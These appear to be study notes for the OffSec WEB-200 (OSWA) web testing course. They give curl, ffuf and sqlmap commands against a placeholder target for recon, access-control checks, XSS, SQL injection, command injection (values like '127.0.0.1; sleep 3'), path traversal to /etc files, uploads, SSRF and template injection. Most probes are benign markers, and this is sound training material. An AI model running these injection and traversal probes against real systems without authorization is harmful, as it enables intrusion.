---
title: OSWA
---

# OSWA

WEB-200 notes for testing a deliberately scoped application. Build a route and
parameter map first; payloads are useful only when the request, parser, and
authorization boundary are understood.

## Baseline the application

```bash
# Record status, headers, cookies, redirects, and response timing
curl -sk -D headers.txt -o body.html -w '%{http_code} %{time_total}\n' https://target.example/

# Discover content while preserving status and length for comparison
ffuf -u https://target.example/FUZZ -w wordlists/content.txt -mc all -fc 404 -of json -o ffuf.json

# Enumerate virtual hosts against the known address
ffuf -u https://192.0.2.40/ -H 'Host: FUZZ.target.example' -w wordlists/subdomains.txt -fs 0
```

For every interesting request, record method, route, parameters, content type,
required role, state-changing effect, and a clean baseline response.

## Authentication and access control

```bash
# Compare the same resource as two supplied test users
curl -sk -b alice.cookies https://target.example/api/orders/1001 -o alice.json
curl -sk -b bob.cookies https://target.example/api/orders/1001 -o bob.json
diff -u alice.json bob.json

# Preserve cookies and follow the complete login redirect chain
curl -skL -c cookies.txt -b cookies.txt -d 'username=alice&password=LAB_PASSWORD' https://target.example/login
```

Test horizontal and vertical authorization separately. Change one object
identifier or one role assumption at a time, and confirm server-side impact.

## Input reflection and XSS

```bash
# Locate a unique marker and determine its output context
curl -skG --data-urlencode 'q=OSWA_MARKER_7f3a' https://target.example/search | rg -n 'OSWA_MARKER_7f3a'

# Check how reserved HTML characters are encoded
curl -skG --data-urlencode 'q=<OSWA_TEST>' https://target.example/search
```

Classify the sink before constructing a lab proof: HTML text, attribute,
JavaScript string, URL, CSS, or DOM-only. Stored and DOM flows require separate
source-to-sink tracing.

## SQL injection

```bash
# Compare a baseline value with true and false boolean tests
curl -skG --data-urlencode 'id=10' https://target.example/item -o baseline.html
curl -skG --data-urlencode 'id=10 AND 1=1' https://target.example/item -o true.html
curl -skG --data-urlencode 'id=10 AND 1=2' https://target.example/item -o false.html
wc -c baseline.html true.html false.html

# Replay a saved request against the authorized lab target
sqlmap -r requests/item.txt --batch --level 2 --risk 1
```

Confirm the injection context, DBMS, column count, and observable oracle before
attempting extraction. Avoid mixing syntax guesses from different databases.

## Command injection

```bash
# Use timing to test a suspected shell boundary without destructive effects
time curl -skG --data-urlencode 'host=127.0.0.1; sleep 3' https://target.example/ping

# Send a unique marker to distinguish output from normal content
curl -skG --data-urlencode 'host=127.0.0.1; printf OSWA_7f3a' https://target.example/ping
```

Check the operating system, invoked binary, quoting context, separators,
encoding layers, and whether output is returned or blind.

## Traversal and file inclusion

```bash
# Test canonical traversal with URL encoding controlled by curl
curl -skG --data-urlencode 'file=../../../../etc/hostname' https://target.example/download

# Compare single- and double-encoded traversal behavior
curl -sk 'https://target.example/download?file=..%252f..%252fetc%252fhostname'
```

Distinguish path traversal, local file inclusion, remote inclusion, and a fixed
download mapping. Normalize the path locally to understand filter order.

## Uploads

```bash
# Upload a harmless marker and save the complete response
printf 'OSWA_UPLOAD_MARKER\n' > marker.txt
curl -sk -F 'file=@marker.txt;type=text/plain' https://target.example/upload -D upload.headers

# Inspect type from bytes rather than extension
file marker.txt
xxd -l 32 marker.txt
```

Track validation of filename, extension, MIME type, magic bytes, storage path,
retrieval route, server-side processing, and execution permission independently.

## SSRF, XML, and templates

```bash
# Test whether the server fetches a controlled lab listener
curl -skG --data-urlencode 'url=http://192.0.2.10:8000/ssrf-marker' https://target.example/fetch

# Send a benign XML document to identify parser behavior
curl -sk -H 'Content-Type: application/xml' --data '<root><value>OSWA_XML</value></root>' https://target.example/import

# Compare arithmetic strings to detect server-side template evaluation
curl -skG --data-urlencode 'name={{7*7}}' https://target.example/preview
```

## References

- [Official WEB-200 exam guide](https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
